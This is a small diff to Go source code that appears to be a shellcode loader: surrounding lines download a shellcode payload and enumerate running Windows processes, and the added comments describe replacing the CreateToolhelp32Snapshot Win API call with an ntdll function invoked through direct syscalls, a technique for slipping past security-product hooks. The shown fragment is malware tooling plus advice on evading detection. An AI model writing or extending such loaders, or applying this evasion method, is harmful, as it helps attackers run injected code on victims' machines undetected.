@@ -88,7 +88,9 @@ func downloadPayload(url string) ([]byte, error) {
 	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
 	return payload, nil
 }
-
+// Note the usage of win api here is not the same as using the win api for our real purposes
+// if you would like to bypass the usage of win api here, you could sub out the create toolhelp32snapshot function
+// for an equivalent ntdll exposed function and call it directly with my libraries' direct syscall func :3
 // getProcessList retrieves a list of running processes
 func getProcessList() ([]ProcessInfo, error) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
